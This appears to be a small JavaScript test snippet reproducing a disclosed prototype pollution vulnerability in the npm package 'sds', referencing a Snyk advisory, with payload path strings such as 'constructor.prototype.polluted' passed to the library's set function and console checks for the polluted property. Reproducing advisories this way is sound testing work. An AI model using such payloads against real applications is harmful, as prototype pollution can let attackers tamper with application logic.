// //https://snyk.io/vuln/SNYK-JS-SDS-564123
// test("prototype pollution in sds", () => {
  const root = require("sds");

  obj = {};
  //let payload = "__proto__.polluted";
  let payload = "constructor.prototype.polluted";

console.log({}.polluted);

  root.set({}, payload, true);

console.log({}.polluted);
// });
